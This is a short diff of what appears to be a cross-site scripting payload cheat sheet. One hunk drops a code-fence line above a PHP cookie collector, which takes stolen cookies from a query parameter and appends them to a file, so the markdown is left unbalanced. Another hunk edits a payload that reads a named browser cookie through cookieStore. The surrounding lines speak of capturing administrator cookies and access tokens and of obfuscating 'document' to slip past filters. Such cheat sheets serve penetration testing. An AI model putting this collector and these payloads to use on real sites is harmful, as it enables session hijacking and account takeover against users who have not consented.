@@ -117,7 +117,6 @@ Obtains the administrator cookie or sensitive access token, the following payloa
 
 Write the collected data into a file.
 
-```php
 <?php
 $cookie = $_GET['c'];
 $fp = fopen('cookies.txt', 'a+');
@@ -780,7 +779,7 @@ window["doc"+"ument"]
 This is another way to access cookies on Chrome, Edge, and Opera. Replace COOKIE NAME with the cookie you are after. You may also investigate the getAll() method if that suits your requirements.
 
 ```
-Promise.resolve(window.cookieStore.get('COOKIE NAME')).then((cookieValue)=>{console.log(cookieValue.value);});
+Promise.resolve(window.cookieStore.get('COOKIE NAME')).then((cookieValue)=>{alert(cookieValue.value);});
 ```
 
 ### Bypass using javascript inside a string
